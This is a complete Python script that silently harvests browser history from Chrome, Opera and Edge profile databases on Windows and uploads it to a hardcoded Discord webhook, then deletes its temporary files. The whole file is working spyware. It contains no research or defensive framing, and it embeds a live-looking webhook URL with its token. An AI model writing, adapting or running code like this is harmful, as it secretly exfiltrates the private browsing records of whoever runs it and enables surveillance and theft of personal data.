import os
import sqlite3
import shutil
import ctypes
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1255615157221195877/OHNjGv4u3xNOUYvFF3W24s30Khg-RVVN9cEEbyVg9LYJOPsSmUQrp38cOofpFZQ8S8Xk'

def send_file(file_path):
    with open(file_path, 'rb') as file:
        files = {'file': (os.path.basename(file_path), file, 'text/plain')}
        response = requests.post(WEBHOOK_URL, files=files)
        if response.status_code == 200:
            print("File sent successfully.")
        else:
            print(f"Failed to send file. Status code: {response.status_code}")

def fetch_history(browser_name, browser_path):
    history_entries = []
    for root, dirs, files in os.walk(browser_path):
        for dir in dirs:
            history_db_path = os.path.join(root, dir, 'History')
            if not os.path.exists(history_db_path):
                continue
            filename = f'{browser_name}History_{dir}.db'
            shutil.copyfile(history_db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                entry = f'URL: {url}\nTitle: {title}\nVisit Count: {visit_count}\nLast Visit Time: {last_visit_time}\n'
                history_entries.append(entry)
            cursor.close()
            db.close()
            os.remove(filename)
    return history_entries

def main():
    history_entries = []
    try:
        chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        if os.path.exists(chrome_path):
            history_entries.extend(fetch_history('Chrome', chrome_path))
    except Exception as e:
        print(f"C: {e}")
    
    try:
        opera_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software')
        if os.path.exists(opera_path):
            history_entries.extend(fetch_history('Opera', opera_path))
    except Exception as e:
        print(f"O: {e}")

    try:
        edge_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
        if os.path.exists(edge_path):
            history_entries.extend(fetch_history('Edge', edge_path))
    except Exception as e:
        print(f"E: {e}")
    
    temp_file_path = 'browser_history.txt'
    with open(temp_file_path, 'w', encoding='utf-8') as file:
        file.write("\n".join(history_entries))
    
    if os.path.exists(temp_file_path):
        send_file(temp_file_path)
        os.remove(temp_file_path)
    else:
        print("No history found or failed to write to file.")

if __name__ == '__main__':
        main()